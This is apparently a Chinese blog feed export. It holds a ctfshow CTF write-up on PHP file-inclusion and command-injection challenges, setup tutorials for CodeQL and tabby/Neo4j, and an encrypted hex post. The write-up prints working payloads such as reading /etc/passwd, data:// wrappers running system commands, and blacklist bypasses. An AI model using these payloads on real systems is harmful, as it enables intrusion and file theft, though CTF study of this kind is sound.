首先尝试一下能不能文件包含，?c=include$_GET[a]?&gt;&amp;a=/etc/passwd，读取成功，可以文件包含
通过响应头得知为nginx，所以日志文件位于/var/log/nginx/access.log，成功读取，然后我们便可以利用日志文件来进行文件包含，具体操作如下图所示：

接下来就是读取文件，得到flag
当然上面由于日志文件的原因在实际操作中比较少见，所以再来个预期解
?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php

ctfshow-web37&amp;38&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;

第一种
利用include来进行日志包含，得到flag
第二种
利用php伪协议，如下
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAnKTs/Pg==：得到当前目录下的文件名
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==：得到flag
ctfshow-web39&lt;?php//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c.&quot;.php&quot;);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;

看到.php位于include函数，最开始想着是把它给注释掉，用//，然后使用伪协议来绕过，但是当一切的代码都base64编码后很奇怪地没有起作用，于是我就直接不编码，直接运行，成功了，如下
?c=data://text/plain,&lt;?php system(&#39;cat fla?.php&#39;);?&gt;//：查看源码得到flag
但是查看源码的时候发现后面的.php并没有被注释掉，尝试去掉注释符发现还是可以，查看源码.php直接为html所显示的内容
查看题解得知include函数只会执行&lt;?php?&gt;里面的内容
ctfshow-web40&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;

不会做，查看题解
法一
c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要POST传入参数为1&#x3D;system(‘tac fl*’);
get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。
next()将内部指针指向数组中的下一个元素，并输出。
array_pop() 函数删除数组中的最后一个元素并返回其值。
法二
c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));
getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())
localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”
pos():输出数组第一个元素，不改变指针；
current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样
scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录
array_reverse():数组逆置
next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
show_source():查看源码
pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。
每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。
提示：该函数不会移动数组内部指针。
相关的方法：
current()返回数组中的当前元素的值。
end()将内部指针指向数组中的最后一个元素，并输出。
next()将内部指针指向数组中的下一个元素，并输出。
prev()将内部指针指向数组中的上一个元素，并输出。
reset()将内部指针指向数组中的第一个元素，并输出。
each()返回当前元素的键名和键值，并将内部指针向前移动
ctfshow-web42&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;

 &gt;/dev/null 2&gt;&amp;1将标准输出和标准错误重定向到 /dev/null，这样就会忽略这些输出，不会显示在页面上，并且这个也是访问不了的
使用 “ ; “ “ || “ “ &amp; “ “ &amp;&amp; “ 分隔

; &#x2F;&#x2F;分号| &#x2F;&#x2F;只执行后面那条命令|| &#x2F;&#x2F;只执行前面那条命令&amp; &#x2F;&#x2F;两条命令都会执行&amp;&amp; &#x2F;&#x2F;两条命令都会执行

get传参的话&amp;需要进行编码
?c=ls;：查看当前目录下的文件
?c=cat flag.php;：查看源码得到flag
ctfshow-web43&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

过滤掉了cat函数，所以我们就是用tac函数来打印文件内容
剩下的跟上题操作一样
ctfshow-web44&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

这题读取文件函数用tac，flag.php文件用通配符来代替，剩下步骤与上题一致
ctfshow-web45（替代空格）&amp;46&amp;47&amp;48&amp;49几题之间的差别就是黑名单的不同，但是都可以用以下操作实现绕过
&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

用%09或者$IFS$9来替代空格，其实就是tab的url编码形式，但是直接按tab键会使光标跳到分隔符之后或者跳在历史记录中的下一条记录
剩下操作与前面无差
web-50&amp;web51web50&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

这题可以拿来替代空格的式子全部都被过滤掉了，所以我们需要另辟蹊径
上网查阅可知&lt;,&lt;&gt;也是可以替代空格的，所以我们可以构造出这样的payload：?c=tac&lt;fla&#39;&#39;g.php||
web51这道题多过滤了一个tac，但是问题不大，已知ca&#39;&#39;t依然可以起到本该有的作用
所以构造payload为：?c=ta&#39;&#39;c&lt;fla&#39;&#39;g.php||
web-52&amp;web-53&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

这题我们就需要另一种式子来替代空格，即$IFS
除了这个外该题还有一个坑，就是直接ls的话你会看到一个flag文件，但是打印的时候打印不出flag，其实真正的flag存在根目录处
payload为：?c=ca\t$IFS/fla&#39;&#39;g||，得到flag
web-53
这题只需要替代空格的式子改为${IFS}便可以了，但是不知道为什么$IFS这个不行，猜测可能是其字母会和后面的文件名混起来，起不到作用
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>工具codeql的学习之路</title>
    <url>/2025/04/18/%E5%B7%A5%E5%85%B7codeql%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[引用https://blog.hackpax.top/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E7%AF%8702-codeql/
CodeQL概念CodeQL是一个免费开源的代码语义分析引擎，其利用QL语言对代码、执行流程等进行“查询”，以此实现对代码的安全性白盒审计，进行漏洞挖掘。
简单来说，CodeQL是一个把需要审计的项目先转化成类似数据库的形式，并基于该database进行分析的工具。
搭建1.下载CodeQL引擎https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip
先把该引擎配到环境变量，方便执行CodeQL语句。CodeQL配置环境变量只要把其根目录配进去就完事了，结果如下即可：

2.下载SDK：https://codeload.github.com/github/codeql/zip/refs/heads/main
我们之后要在该SDK下面写ql语句并执行。
3.vscode下载CodeQL插件：然后会在vscode左边的侧边栏发现”QL”图标，即是CodeQL图标。
打开设置，把CodeQL引擎的路径写上去：

4.Maven项目建库首先我们需要在本机上安装一下maven：Download Apache Maven – Maven
然后再配一下环境变量
当审计maven项目的时候
打开Maven项目，把项目构建好；除此之外，还需要添加一个插件，本人是先下对应依赖再添加：
&lt;dependency&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;            &lt;version&gt;3.4.0&lt;/version&gt;&lt;/dependency&gt;&lt;plugin&gt;             &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;             &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;             &lt;version&gt;3.4.0&lt;/version&gt; &lt;/plugin&gt;

然后先执行：
mvn clean install --file=pom.xml

成功构建了，再执行：
codeql databse create name_1 --language=java  --source-root path_1

path_1是当前需要审计的项目路径，name_1是CodeQL将要建立数据库的名称
5.vscode执行查询以下操作都在vscode执行，先打开CodeQL选项卡。
先把SDK目录放入下图，并放入工作区：

然后添加数据库，我的name_1位置的参数（生成的数据库名）命名为codeql
然后在工作区找到SDK（第一个，codeql-main）：

在codeql-main打开路径&#x2F;java&#x2F;ql&#x2F;src，写一个demo.ql：
import java from Method methodwhere method.hasName(&quot;getValue&quot;)select method.getName(), method.getDeclaringType()



确保Java库正确导入

然后运行：


至此，CodeQL的构建就完成了，之后就是学习语法，不断实践了。
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>工具tabby的学习之路</title>
    <url>/2025/03/24/%E5%B7%A5%E5%85%B7tabby%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[前言原本没想着这么早就开学tabby，但由于学长发了个java题目来锻炼锻炼我的能力，一开压缩包我了个豆40MB，自己审计不知道要审到猴年马月，做ctf讲究一个效率，所以毅然决然来开tabby
（没想到开了三天才结束。。。）
环境搭建tabby配置（截至到2025.3.24，tabby最新版本为v2.0.0）
tabby需要的java版本为17，所以请先把自己电脑里面系统环境变量中的java版本改为17

在项目地址：https://github.com/wh1t3p1g/tabby的release下载下最新的tabby，如果出问题了可以pull一份源码自己本地用gradle编译一下（注意gradle使用的jdk环境也得是至少17）
一个编译打包好的tabby目录结构应该如下：
$ tree.├── cases # 用于放置待分析的项目，可以是单个文件，也可以是目录│   └── commons-collections-3.2.1.jar├── config # 用于放置配置文件│   ├── db.properties  # 配置数据库相关内容│   └── settings.properties  # 配置待分析项目、污点分析等内容├── output # 用于放置生成后的csv文件│   └── dev├── rules # 规则文件夹│   ├── basicClasses.json │   ├── commonJars.json # 用于排除无需分析的三方jar│   ├── cyphers.yml # 用于 tabby-vul-finder 自动化检索│   ├── sinks.json # 用于配置 sink 函数│   ├── system.json # 用于配置专家规则│   └── tags.json # 用于配置source点识别├── temp # v2.0 版本开始将临时文件都生成到同级temp目录下├── run.sh # 运行各类任务的bash脚本├── tabby-vul-finder.jar # 用于导入和自动化查询的 jar└── tabby.jar # 核心jar，用于生成图数据

我们下载下来的tabby的config目录下面只有一个settins.properties文件，这是正常的，不用担心
还要更具体的信息可参考官方文档
第一次运行的话会创建一个output目录，并且还会报错，这很正常，看报错是说target没有找到目标，这是对的嘛，毕竟我们都还没指定要分析什么目标

Neo4j配置注意：由于 tabby-path-finder 需要使用 Neo4j 5.x 版本，推荐默认采用 5.x 版本
首先不是特别建议下载neo4j desktop，
否则你将面对的是：

初始化向被墙的neo4j站点发送签名验证，如果没走代理可能进程打开了但是没有界面弹出来
即使走了代理也可能抽风403
明明环境变量确实是17但是启动数据库仍然提示主类找不到
数据库启动异常缓慢，明明成功启动了但是还是报错得再点一次

当然，以上除了第一二点，其他的可能存在个人因素，总之各有千秋
这里侧重使用社区版：
在官网：https://neo4j.com/deployment-center/#community
或
微云的站点：https://we-yun.com/doc/neo4j/
在微云里面我下的是5.26.4
下载完后就随便扔在一个地方就行了，环境变量想配的话也可以，不想配的话就每次到bin目录下面执行相关命令就可以了
（证书似乎也可以不装，没影响）

相关的指令

console: 直接启动 neo4j 服务器install-service | uninstall-service | update-service ： 安装&#x2F;卸载&#x2F;更新 neo4j 服务start&#x2F;stop&#x2F;restart&#x2F;status: 启动&#x2F;停止&#x2F;重启&#x2F;状态-V 输出更多信息

进入到bin目录，执行
neo4j console


在浏览器中访问http://localhost:7474使用用户名neo4j和默认密码neo4j进行连接，然后会提示更改密码（要记住更改完后的密码）

接着我们回到tabby的官方文档去看看关于Neo4j的相关配置
文档中让我们下载两个插件，并且对应的版本不能弄错

插件下载完后丢到plugins目录下面就好了


在settings.properties里添加一个字段，是你本地的tabby（实际上高版本tabby在这里填没什么用，可填可不填，他不会自动上传数据库）


在conf\neo4j.conf下，修改一些配置
取消下面代码的注释
server.directories.import=import

允许apoc插件，将注释的这条改为下面这条

dbms.security.procedures.unrestricted=jwt.security.*,apoc.*

下面几个内存分配字段自己看着改一改，和tabby文档有点不同的是这里是server.而不是tabby文档中的dbms.开头

在conf目录下创建一个新文件apoc.conf，内容
apoc.import.file.enabled=trueapoc.import.file.use_neo4j_config=false

至此neo4j该配置的也配置完了，重启一下看看效果
查询语句
CALL apoc.help(&#x27;all&#x27;)

apoc插件启动正常

查询语句
CALL tabby.help(&#x27;tabby&#x27;)

tabby-path-finder依赖启动正常

剩下的就参考官方文档中给出的，对数据库做一些前期工作了


扫描结果上传至neo4j数据库（由于后续的过程我自己配并进行测试的时候出了挺多问题，所以版本改来改去的，现在我用的tabby版本为1.3.2-2，用的neo4j版本为5.9.0）
前面提到过了，高版本的tabby是不会自动将结果上传到neo4j，所以这里需要用官方给出的另一款工具
tabby-vul-finder
笔者的教训是直接将其克隆下来而不是下它的realese，因为它的分发版里面少了听过东西，用的时候数据上传不全
该工具的配置文件db.properties要按自己的neo4j配置来进行改动
接着我们开始测试，这次测的是maven库里面自带的cc漏洞版本
setting.properties内容如下：
# need to modifytabby.build.target                        = C:\\Users\\BD\\.m2\\repository\\commons-collections\\commons-collections\\3.2.1\\commons-collections-3.2.1.jartabby.build.libraries                     = libstabby.build.mode                          = gadgettabby.output.directory                    = ./output/dev# debugtabby.debug.details                       = falsetabby.debug.print.current.methods         = true# jdk settingstabby.build.useSettingJRE                 = truetabby.build.isJRE9Module                  = false#tabby.build.javaHome                      = /Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Hometabby.build.javaHome                      = C:\\Program Files\\Java\\jdk1.8.0_65tabby.build.isJDKProcess                  = truetabby.build.withAllJDK                    = falsetabby.build.isJDKOnly                     = false# dealing fatjartabby.build.checkFatJar                   = true# pointed-to analysistabby.build.isFullCallGraphCreate         = falsetabby.build.thread.timeout                = 2tabby.build.method.timeout                = 5tabby.build.isNeedToCreateIgnoreList      = falsetabby.build.timeout.forceStop             = falsetabby.build.isNeedToDealNewAddedMethod    = true

启动tabby（命令中的xmx参数不是必需，看自己要求）
java -Xmx8G -jar tabby.jar

成功运行的话会返回done bye
然后我们去看ouput&#x2F;dev目录下面会生成几个csv文件

接下来利用tabby-vul-finder工具将csv数据上传到neo4j上
java -jar tabby-vul-finder.jar load E:\safety\tools\tabby\output\dev

然后到https://github.com/wh1t3p1g/tabby/wiki/%E7%8E%B0%E6%9C%89%E5%88%A9%E7%94%A8%E9%93%BE%E8%A6%86%E7%9B%96中找一个cc2的指令来测试一下
成功查出！！！

历尽三天的折磨，笔者终于是成功用上了
简单改一下官方给出的找setter-&gt;jndi的查询语句
match path=(m1:Method)-[:CALL*..5]-&gt;(m2:Method &#123;IS_SINK:true&#125;) where m1.NAME =~ &quot;get.*&quot; and not m1.HAS_PARAMETERS return path


注意点
这问题困扰鄙人许久许久了，终于是在今日成功解决了


要是java的版本也变了，那么jre_libs目录需要删掉，否则本次运行的java版本还是上次的，即使配置文件改了也没有用

在每次换了target之后，在运行tabby之前需要先将上次运行结束后的csv文件全部删掉，避免污染了本次的csv文件

在每次用tabby-vul-finder工具上传我们的csv文件到neo4j之前，我们首先要将neo4j上的数据库文件全部清除掉，虽然taby-vul-finder工具是说会自动清除旧数据，但鄙人这边是没有的。。。

在neo4j上自动清除掉所有数据库文件的命令：
CALL apoc.periodic.commit(  &quot;MATCH (n) WITH n LIMIT 1000 DETACH DELETE n RETURN count(*)&quot;,  &#123;&#125;)

最后的最后，neo4j的查询语法真心不难学，看着tabby作者提供的那些例子来学就足以了：https://github.com/wh1t3p1g/tabby/wiki/%E7%8E%B0%E6%9C%89%E5%88%A9%E7%94%A8%E9%93%BE%E8%A6%86%E7%9B%96


]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>开局一个登录框该如何处理</title>
    <url>/2025/07/01/%E5%BC%80%E5%B1%80%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E6%A1%86%E8%AF%A5%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[
  d282e783d8801791e9fe26bf6ae163c782c4f0dbc93fab6fe82f05a302abd35333ab01a27e114fb0675c8847d570bdaf51532e3c48e9382c26fad84e5b319c067f58e1c3c294e0763093d7fc5c25ce9f6c0cee457d8b89873e183e67fc955db2e35df2093b3a8060a0cf5ef9bb33519e00cba0d71cec2baf01b0693d5c9de1ac6d87ad00739d23751cf8539e79e36f87d41c390872befa910f7a21487bc1f3bd66aeb1a97efa1cab33efc089f7cdbeb6e5797ba0474034d2e0fc27e9faf348545aad49a820231567e9bde51c54753721d9ef3b717be2e68b6c9906866cb91230403595596b5296af020261ab4ad1688ac0b6ec1086d09be9350bc8930c3eb5a6431db83b9ec63f834fdfedbee206e8b0f9f582c06533211edb2e42c396b7db7158b80a431deb72cc3badb6ef8a053ec01e09b846ef42fba2188c9e57879780b6eedddb5f9d8848c7152a1586e7fc1d4999724c80d7012a62a701b8bbb23dbf02533964d50bea184d4a9ea57f6b8996107d7f699015a502e42f92fc56a1cb15be7c8f05c7060176578416477d852fa7f714de33a566768109c9c2de86ff3eb36f94c567c44104f4720c7ede10820eae32bd3da15a4501787017980a592910ac60c71c26b528af6fa8887291c8844da30f043a40327c988d2ba7bc0257cb986509ca4656575f952bbfb5b23c3ee4048b947023aeb2e236302a2e11634a5f240716093671df32701cb20b08974169b8ac15effcc3387eec50b5017b9b111f1a04abff5d19fa04bf1e8e24bb74ac5dc374f75789f2cb21a6d74744e65edd2443b49bdc255961fe870a76075af3a40f62693b2b236c7e6597d9a7a9ebdc011ddd5d081ccbdcb7bcc902a4c791ab090fbe04877f4175f9635f3b3ee0b150b65d0d7a0f102ae06dee4233ccaf69edde4a4a7da189e8952eddc58fa4261a0a8cf74cdef99eee58703399dbb80080fb6e4595a2c5b3b284cb2072481a00b41c5f2932dc5ea8ef37cbbbfffa29cf0ef4da88d727785e8f620928d78192df51e8311692a7392648e22e49e6b871d17e85b8d274df1f870e5ab42087ff0cb9fb2facf4e3e686e23fd810f037f5c0d778ea6253d815c9632e2e3ed1a75ffdb3653fa0d2f1c1040a8e2c3f2160ce5224dd8376ea60c950e132e628a358e1b046eb38062a57d93bcbdabf50b7b408f5ce85d2c3609e982fbb90b414e21920f44c59da9b577a1898b017bb13d89291569e5c3789bf026feef3c4d6ba7ef2daa8a4f7088bcf942cb88e963fb45e49d53ac15d01f3dd541d6b726e4799b21d57db307525125fe70c7a98497731b2f88d1cd504b636ccc18c0ff322124ccc0cd000f5eb22cf3577419773e737982c39e1302958ab4e1d94e3c409f958b31ef05d9be1cb74a938407a155ecebd75a4ffcf6a6fb0dcb15f3da6082eca7fd5b07ee6c1d265e06e3aa72a5be46b9198d31edbe0de419ef6af3a9b4d738538fcee99f02897146cf5475491f8263e4f7e306a6c9227689b1adbe8be397efe187a2d3a8519ee938cd47ae67a987d30ed267f412ccc70e1c8c38802c51fe913f2151a1c04b4f5e2a99b14d6fb5f8512a77299392af29c6e22cf668440b03e4a438368d174d4d15a177e08bcea1a24d2415baf1e7d91aba9c32927f8380f3d20c220eb78f998609924765395b30ed1cda1d379319f89bc3e1d0f8ed93baca8ed30b2248d12c0f0c448704f7488d75da35d1aab5f25178cad31758ab30c87006945b566a08ceebd17e0dd926f53196a919d86ba059b0e04524fac2464140a6572a4af30835188a4cc17fff4dc88904ad861720c4b3a1681cfaaa74b5a2c8fb83a1246d030ea3a48e07448ebf4e6445e34eab46b92553095835d4c1299e01f541cc16611e54875386d902d21bbec2b39b946392ace19c80324d2f05c738f7853a420ec7cd56fc4fc31d769480d0f8222ec9daaab1d8eb776c019a9b7b16757231d3b33f54262c90ee742f17127e8399912d94a4929bdeb2220d1b5886a3ef200e736de2dc34fd43f40d1511da324d3bd0aaebc07b22c147bdda34904c628c6968ee96061461756cd39cb0660c8c405c585755fae81fff9320caa69a1d87991ff7297dab2124bc80a43aad00324f1ec5e818651a63b6875136a593d808f356f4c27e869e9b63c84c6cda9524609e0a257ef4618519c9db0695671b91a0def6f89037b353e7f137244c2b6d52fa5a6f1d38873609d0236f0637d75ccd68f3200097ef672dc2c2d64037fb2a29aec01018d320ce4ae85bbe910db2cdf088318c218794eede0595ea20e36fe1f41b72f2dc523c76b9e965121e19d699945104cfea9a3336d0b5d8d7a1133b97acdf783f84b86190c34775759da35737afa65c41ebd52d6d52fb6d00438849874bbc46d6f5e0b0d1aeb69b9a21426952b92c1b82d8f276fe7a0295d9e183a4980895d77dbacc77e10e2c02f87dea81df021c4ec889745dec9c5c2f63c092ff00e0e25663e87964df99143390b5ad60a409d01baf07f82ad7d432d88a39bb45622e365fcfe820d648c245b27d1028570905f74e9bfd308790e6cc1069f114130f09ba2636dee4f29502d03a115cba081524c82041e01578fbd82a3e011a789c74c615e0437ea1bb49175fd6c0b305069f14d9f89c5bb1fbadc4c0be1b98784a3d54c801456ef802fafdb13d37393c365f32abe3a90c81033704752c80f594952417a94e0b2c53c9fc958813283660320105b20b8167f93504611c33c98d4bdb1e8a08e525629638be9586423bcef49ed7c96c37413536925705fb9566c6bf6ad5fbae0614ac808b8785dc5a0200d2a017970d4b389d4de330216b7de5ce911c58b9517360c8588753cf9de6761aa1a3b08005b212d16ef31ff3d66353a3b7fa2725324710c4d24485d22eca528cb13ee4ce4f99391d82123426b44cc85c968da44843558d087b20e8e52e15e61f32a94e11d9d81d9b422ea4ee6373158326e2cfc3a6400e5491ade3ea96ca46b362a3390f90743652c02aec5217bb6ac077b9f780914c75f127ebc0ba628ad0be94d2c782f9923e053bfd4be577c795be953e266dcc53bb2636b20d00cb78958bf06244d421701c247211b7d25553f8b3070142eb197a9ded7356d5ad160b90052dcebf82ad3eebc411e76946616d113a240bcfe4c36b181bc7ffe51a0922d983137481fa0d1196c32a6a6ef2131b151656119c6ff37f1e73a2e25569272e47a10226dc089fb4c0d3343d0042dca99e0bad7400c4f2c4b20cc415486a57e0c06182f90d24779f75ac60c0da6f4099cee8d5fcaad460e2e3b1192d8cc31acb77c246bd180b4c72cca1a6692a63b93a43f44e6b10052331cdfea0bd044a975c1d0657fe1ed0de62207ee4c78e6d462689fdd2dc1d6ba8316c6028eeef42c9af2f54bce276c402d9ce28ab5b6828989e64cb2de30bc5652d24a2f25c37378f5054b13ac89bae676bac38a0f1ec3b3eebde7456b485ab1e8d498d7468f12ff9b2f510ef55dbfab0cbc9279cd0fefc823e874680c8eb2e28829914c75220031e3a90be4341620f61d49330d0ec05a97a2624eecdd282067cad5f3da37272bef6ac1e8bef7dc1997c2983426b06fe2eb1e8aef9eede0f1fafc9711c3d88f248642fff980588f641ff1874aa0c0b0ac4d1d29e4345992d0b3e4889d75c1b8a1936d9aa7f602f35d4a297ce4662a9c8eaf657029f7fdbbdec578a3ce56dfb9d84fa081b9c386c75631187b192bf9e9214080a545c47f9bf828e79a29731c35a7c7dc004a48601b0f39ddd9a87b3c61fb0f62bbf16db4f1b6703f7bb1b0bc7ab31e4df42b585cf39d8b2b2aa949a043abb1bbbb2303dcbf06ae04d495bfdadcf16a7104ec9404819e90b7eb2c0f06512a2c8e1b0314ccdf7ac3669cf5ccc0773c1b807794bd97e6ab8ad992e6e73203ace7b83573e85ab454086a0284d4721255949bf9d181a71ec6cfc65d515952873143373319cbc79ea899a7fd61cc9cc2d3e48e74c052639bdc72f5b1e3f97ef2bd2d967fb20cde8eaaf23289656fedca636a62e3f81af53629be58dfe7f577400f468c9f26b23a3f4a6f6b5dd4b99f5719a9d652e526c8a24181faa106daf0ce3ba611f4f319d59d545465c01aad0b046f7ba4b37fb1ee39f0234db8e4634b8cc4ae43062c9a38a7e75afc113faffc3797bb15e38e440282b594922236eaffa89b36ae87782a620d2ccff9ce9774fd51f3272a486d97f2d07d28e2d87c02b978500609ab5d3aed6eb7368ede2c794c040b49dff01157181ed1feb8790e1acb5b19dad6302af39bfcbfcf6f1ac99aa416e20e46830a3ad21788fa2ee9e40af08a71da1634a0dfa5fd31b8dca80a472a951bf9f59bc126947ebe10fcf977b34a8da273d85f0b989ad3e09d15091de89e0a354c4b29d8767a3bfac3b5fbd216c50749a8b5bc9b9a255b46384d0e1fb710fa02e8d670d63639c83da52156d1c4079a83087b45d379ca58c5713efb112b50f32d821d0d9c5f7652dc044d89f74b7112fe0e9aae8b10375b73085212a1335268f101e330f9489f99fdfd20aa3c75fc2573114c0253b2c945c2e4570a23e11ca3bde24ffee1237aaffe13451608a68c64ba26d0064b5a8923ac65ebd09eef17040f09df758a8754b72902a000d9db70167758b6c2f407c6d47b201e6c4c9e7e9f63e29ef72fe38d4682074c2c545dca5b731277c1d0976ce1360404c0eab9c29a962556ece91c2d380048f6abeb3225ddc94e9879469f9198f20cffce601519e0d4b74bf36f55620d48ea007f7c1c794efac09639a00b6a2dd6210d037d70a3e7c9b7a000e92e0e9a99fc760d00af3dd7c7bcbf173bc8f0649861c6c5195367cb8e754578887427efe58b81d6fb4ebd434cdf5be070c4e7c65c30071bd88afd975b4e4c3ca8f3685fb596021a133ae2150d14bc372a1b8706357d15fb85364aac5aa9cf450c592795b0b67b5194ca2dae5a30bc260d874aeff7929c6e2e6d8a1604adb4c3ce7deb668ad7a7bf08c92387713b144709b1b74ed79e55b34397856c93b552b87b29f43159c3c18ec03d5461236e38b41d3dfb35337055d3c802305a4a69a82b392fab904914820fd220c2395495cd8e64211ea1c27e9201b4f902aba64b493019dedba1bf0887ed415b7ffb40e999e499a7a2314e5bae730cd6031e27883a0cbfcbff4ecc851b037443237fb1b3d6ffef5e15c97357d4c7f46644e28a6a2438855165fcbf3bc1930aa85a982e7b21ac60d7be254cc1058193217b7371cf72e1dbf439a450f50fce33bc37df48fa41288f7bf2ecbb64ca00b3079a603bbfb7d15d1884ff2ebfd9ab952a5a98f539ce008fb6d6c86a486459b7556c0782e6f3474f083c3b139a4bcbdc618ca5d824d25e1be1bc55a3cff86325bc44d8bdbf044dd125279708371d81c1f05157e189fc86c98e5447211d0b2de507680313c5a501bc5cd02b8bba49ff519c79c13da079e3af6a9821d09c5d9972308176c62455394477e2489842c8e4718f8223a0295c50b465d3106f59fae9a2a5989347b571b103d1e42fe744c491e00141c7e90a7602a37c9dd7cbede052f5fa5ff973fc1b977d64a3869d1a78b0afec81911e27cce635c2b07a828be223cce1e58caf40d46017a115799c84822a604cef6fe0cf22cb2c1cae151efea9d74bfa02766f13b38bf65d001f6b21b94208a595bbdeb58dcf70902b0d0da84c4af46df6e3fe7df6aad2ebb2d55b9ccf4d14acb5382ab12ee1218bac5fe9e36450172664f9892eaf8027ada312fc1a673c1c2ef7b3c77384e689335b3f661ee2f2542123e1aacfc17a6ab7b7abd6d1123a75a3b2ee59d55a1a2a9aee0796c6271726ff1e583ec9229346a9dc30c4e28e48f9618791825f0eafbc9f3e5e8aa6f81c3472e3cc7ce9c4f9f9fb0b7a470b8a3b507938b4c005635c183080e0017f949b027b1840306cf040c684903178d8c8f5521cbc6ee151db7624f6ba806d98ff629dbddb8f0a27b0ece8093914b9e8c65efef2a187ff42ec012e4a7b1033ebf4d6920716efceacf8762d1a8ab58bd2dd1ec257cc5d72d5ff46c42bc5399ea418e77d4b9943395ec197f6abdee94d548e3a5ce4e6db2bcfaa4dae94c92ba76ff6676d64ebfd252137589fff4879dc710959d55a2a1fefa078974e7356746cd665a257cae0a8808665ff7b8ae3e0cf1248ff1e3eba14b84549bcee15cc8845049e0cd6d694aaf65ed374a89c86e222d64a83b80ec343fd114bdd4f52025ae55b17d12a99dcd2a3d9bc6a1b18a92709f5a19aac5c530b665cce3506f3bbcf215a721b2044f3bb25d4748d463463e5a81df2dd53ea6e33cc53284404bcf1ba83b11ac9fa966c531bf40af29f22c78792fd986dfb6a767439c9b365689242a2d1b3701b36c4cc5694aab4eacfe50eac32f5ba997b11e2393a08511e6b0e8f4f68fdfa53b0746eca561e13e8b7844c24360708b18fa69ded3a9093b411b9f2a9f66c562fb3b009020ec1283cd18769b831454f86e873e71d3bfe39d56fbd132652252380c49bb889581552b3934572cce633f0644d0b5a45641946ccbb4628e1ec6dce809c266bcac8f23e526f934b98af2f7c